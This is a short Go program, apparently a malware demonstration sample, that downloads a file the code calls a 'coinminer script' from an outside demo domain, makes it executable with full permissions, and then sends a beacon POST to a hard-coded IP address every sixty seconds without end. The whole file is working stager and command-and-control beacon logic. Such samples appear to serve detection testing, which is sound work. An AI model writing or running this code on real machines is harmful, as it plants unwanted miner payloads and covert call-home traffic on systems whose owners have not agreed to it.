package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"time"
)

func http_post(url string, jsonStr []byte) error {

        req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
        req.Header.Set("X-Custom-Header", "myvalue")
        req.Header.Set("Content-Type", "application/json")

        client := &http.Client{}
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()

        return err
}

func http_get(url string, filename string) error {

	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filename)
        if err != nil {
                return err
        }
        defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func main() {

	// define constants
	const domain = "lwmalwaredemo.com"
	const filename = "install-demo-1.sh"
	const ip = "54.184.116.123"

	var post_url = "http://"+ip+"/lw-beacon"
	var get_url = "http://"+domain+"/"+filename
	var body = []byte(`{"stage":"2"}`)

	// download coinminer script
	fmt.Println("Downloading file: "+get_url)
	get_err := http_get(get_url, filename)
	if get_err != nil {
		panic(get_err)
	}

	// make file executable
	chmod_err := os.Chmod(filename, 0777)
	if chmod_err != nil {
		panic(chmod_err)
	}
	fmt.Println("Done")

	//wait a few seconds then terminate
	time.Sleep(10 * time.Second)

	// beacon home every 60 seconds forever
	for {
		post_err := http_post(post_url, body)
		if post_err != nil {
				panic(post_err)
		}
		time.Sleep(60 * time.Second)
	}
}
